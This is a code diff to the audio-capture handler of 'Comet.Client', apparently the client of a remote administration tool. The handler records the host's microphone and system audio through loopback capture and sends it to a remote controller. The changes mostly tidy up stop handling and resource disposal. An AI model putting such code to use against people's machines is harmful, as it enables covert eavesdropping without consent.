@@ -35,14 +35,12 @@ namespace Comet.Client.Messages
         internal BufferedWaveProvider BufferedWaveProvider;
         private readonly G722CodecState encoderState = new G722CodecState(64000, G722Flags.None);
         private readonly G722Codec codec = new G722Codec();
-        private List<byte> sysPcmBuffer = new List<byte>();
 
-        public override bool CanExecute(IMessage message) => message is GetAudioNames||
-                                                             message is GetAudioResponse||
+        public override bool CanExecute(IMessage message) => message is GetAudioNames ||
+                                                             message is GetAudioResponse ||
                                                              message is DoAudioStop ||
                                                              message is SendMicrophoneInit ||
-                                                             message is SendMicrophoneData ||
-                                                             message is SendMicrophoneStop;
+                                                             message is SendMicrophoneData; 
 
         public override bool CanExecuteFrom(ISender sender) => true;
 
@@ -65,9 +63,6 @@ namespace Comet.Client.Messages
                 case SendMicrophoneData msg:
                     Execute(sender, msg);
                     break;
-                case SendMicrophoneStop msg:
-                    Execute(sender, msg);
-                    break;
             }
         }
         
@@ -84,11 +79,11 @@ namespace Comet.Client.Messages
                 WaveInCapabilities deviceInfo = WaveIn.GetCapabilities(i);
                 getAudioNames.WaveInDeviceName.Add(deviceInfo.ProductName, "microphone");//添加麦克风
             }
-            for (int i = 0; i < WaveOut.DeviceCount; i++)
-            {
-                WaveOutCapabilities deviceInfo = WaveOut.GetCapabilities(i);
-                getAudioNames.WaveInDeviceName.Add(deviceInfo.ProductName , "system");//添加系统播放设备
-            }
+            //for (int i = 0; i < WaveOut.DeviceCount; i++)
+            //{
+            //    WaveOutCapabilities deviceInfo = WaveOut.GetCapabilities(i);
+            //    getAudioNames.WaveInDeviceName.Add(deviceInfo.ProductName , "system");//添加系统播放设备
+            //}
             client.Send(getAudioNames);
 
             try
@@ -110,12 +105,13 @@ namespace Comet.Client.Messages
         OpusEncoder encoder;
         private void Execute(ISender client, GetAudioResponse message)
         {
+            if (_client == null) _client = client;
             G722CodecState encoderState;
-
             switch (message.IsSystem)
             {
                 case true:
-                    //ExtractEmbeddedDll("opus.dll
+                    //ExtractEmbeddedDll("opus.dll)
+                    capture?.StopRecording();
                     capture = new WasapiLoopbackCapture();
                     Console.WriteLine($"默认采样率: {capture.WaveFormat.SampleRate} Hz");
                     Console.WriteLine($"声道数: {capture.WaveFormat.Channels}");
@@ -185,18 +181,10 @@ namespace Comet.Client.Messages
             BufferedWaveProvider?.AddSamples(message.Buffer, 0, message.BytesRecorded);
         }
 
-        void Execute(ISender client, SendMicrophoneStop message)
-        {
-            WaveOut?.Stop();
-            BufferedWaveProvider?.ClearBuffer();
-        }
-
         private void Execute(ISender client, DoAudioStop message)
         {
             capture?.StopRecording();
             microphone?.StopRecording();
-            WaveOut?.Stop();
-            BufferedWaveProvider?.ClearBuffer();
         }
 
         void WaveDataAvailableMicro(object sender, WaveInEventArgs e)
@@ -266,16 +254,30 @@ namespace Comet.Client.Messages
 
         void MicWaveStop(object sender, StoppedEventArgs e)
         {
-            microphone.DataAvailable -= null;
-            microphone.RecordingStopped -= null;
-            microphone?.Dispose();
+            if (microphone != null)
+            {
+                microphone.DataAvailable -= WaveDataAvailableMicro;
+                microphone.RecordingStopped -= MicWaveStop;
+                microphone.StopRecording();
+                microphone.Dispose();
+                microphone = null;
+            }
+            WaveOut?.Stop();
+            BufferedWaveProvider?.ClearBuffer();
         }
 
         void SystemWaveStop(object sender, StoppedEventArgs e)
         {
-            capture.DataAvailable -= null;
-            capture.RecordingStopped -= null;
-            capture?.Dispose();
+            if (capture != null)
+            {
+                capture.DataAvailable -= WaveDataAvailableSys;
+                capture.RecordingStopped -= SystemWaveStop;
+                capture.StopRecording();
+                capture.Dispose();
+                capture = null;
+            }
+            WaveOut?.Stop();
+            BufferedWaveProvider?.ClearBuffer();
         }
 
         //处置与此消息处理程序关联的所有托管和非托管资源。
